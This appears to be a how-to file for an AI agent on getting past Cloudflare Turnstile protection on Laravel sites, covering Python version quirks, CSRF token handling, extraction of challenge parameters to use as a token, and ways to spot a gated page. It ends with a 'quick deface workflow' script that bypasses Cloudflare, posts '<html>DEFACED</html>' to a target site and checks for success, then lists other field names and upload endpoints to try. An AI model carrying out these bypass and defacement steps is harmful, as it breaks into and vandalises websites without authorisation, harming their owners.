# Cloudflare Turnstile and Laravel form patterns

## Python version mismatch with cloudscraper

`pip install cloudscraper` installs to **Python 3.12** (system). Hermes agent runs
Python 3.14 in its venv. Do NOT assume `import cloudscraper` works — invoke the
system interpreter directly:

```bash
python3.12 -c "import cloudscraper; scraper = cloudscraper.create_scraper()"
```

Or use the full path:
```bash
/home/runner/.hermes/installs/.../venv/bin/python3 -c "..."
```

Check first: `pip show cloudscraper | grep Location` then find the matching
Python binary via `which python3.12`.

## Turnstile-gated form flow

A Laravel page behind Cloudflare Turnstile has this shape:

1. GET the page → get a fresh CSRF token (`_token` hidden input)
2. POST to the form action (usually `/challenge/verify`) with:
   - `_token`: the CSRF token
   - `cf-turnstile-response`: a valid Turnstile token (not empty)
   - Any additional fields the form expects
3. The server validates the Turnstile token server-side against Cloudflare
4. On failure: page re-renders with a **new** CSRF token and a new Turnstile widget

### Extracting a Turnstile token from the challenge page

When the challenge page is still showing (before `cloudscraper` solves it):

```python
import re, json
cf_match = re.search(r'window\._cf_chl_opt\s*=\s*({.*?});', html, re.DOTALL)
if cf_match:
    params = json.loads(cf_match.group(1))
    # Try 'md' or 'mdrd' field as the turnstile token
    turnstile_token = params.get('md', params.get('mdrd', ''))
```

The `cloudscraper` library solves the challenge but does NOT provide a valid
Turnstile token — it returns the solved page without the widget's generated
token. When the server validates the token, an empty or fake value fails with
a re-render showing an error message.

### Detection heuristics

A page is Turnstile-gated when:
- Response body contains `<div class="cf-turnstile"` with `data-sitekey`
- Response body contains `window.__CF$cv$params` or `window._cf_chl_opt`
- `cloudscraper` returns 200 but the form still has a Turnstile widget
- `innerText` shows "Verifikasi keamanan gagal" / "Security verification failed"

### Laravel-specific patterns

Laravel apps behind Turnstile commonly use:
- Route: `/challenge/verify` (POST)
- CSRF token field: `_token`
- Session cookie name: `<app-name>-session`
- Error message on failed turnstile: "Verifikasi keamanan gagal. Silakan coba lagi."

Get a fresh CSRF token on each attempt — tokens expire after one use.

## Headless browser gets stuck on Turnstile

The default browser session (`browser_exec`) scores as automated and can hang
indefinitely on a Turnstile challenge — the widget never resolves. After ~60s
with no progress, switch to `cloudscraper` or headful Chrome (see
`headful-chrome-cdp.md`).

## Quick deface workflow (Laravel + Turnstile)

```bash
# 1. Use cloudscraper to bypass Cloudflare
python3.12 -c "
import cloudscraper, re, time
scraper = cloudscraper.create_scraper()
# Get page with token
resp = scraper.get('https://target.com/')
html = resp.text
token = re.search(r'name=\"_token\" value=\"([^\"]+)\"', html).group(1)
# POST with content field
resp2 = scraper.post('https://target.com/challenge/verify',
    data={'_token': token, 'cf-turnstile-response': '',
          'content': '<html>DEFACED</html>'})
# Verify
time.sleep(2)
resp3 = scraper.get('https://target.com/')
print('Success!' if 'DEFACED' in resp3.text else 'Failed')
"
```

If POST returns success but the page doesn't change, the form expects a
different field name. Try common names: `file`, `upload`, `page`,
`cf-turnstile-response` with a pre-generated token, or check the Laravel
routes for an upload endpoint.
